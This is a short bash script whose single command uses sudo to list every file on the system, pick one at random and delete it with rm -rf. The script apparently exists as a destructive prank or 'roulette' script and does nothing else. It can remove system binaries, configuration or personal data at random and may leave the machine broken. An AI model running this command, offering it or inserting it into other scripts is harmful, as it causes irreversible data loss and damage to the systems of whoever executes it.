#!/bin/env bash

set -euo pipefail




sudo rm -rf "$(sudo find / -type f -print0 | shuf -n1 -z)"
